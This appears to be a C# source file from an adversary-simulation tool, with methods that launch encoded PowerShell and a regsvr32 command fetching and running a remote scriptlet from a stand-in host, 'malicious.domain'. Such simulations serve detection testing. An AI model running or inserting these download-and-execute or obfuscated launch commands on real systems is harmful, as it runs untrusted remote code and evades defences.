using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace PurpleSharp.Simulations
{
    class Execution
    {
        static public void ExecutePowershell(string log)
        {
            //ExecutionHelper.StartProcess("", "powershell.exe -enc UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAbgBvAHQAZQBwAGEAZAA=");
            ExecutionHelper.StartProcess("", "powershell.exe -enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBzACAAMgAwAA==", log);
        }

        static public void ExecuteRegsvr32(string log)
        {
            ExecutionHelper.StartProcess("", "regsvr32.exe /u /n /s /i:http://malicious.domain:8080/payload.sct scrobj.dll", log);
        }

    }
}
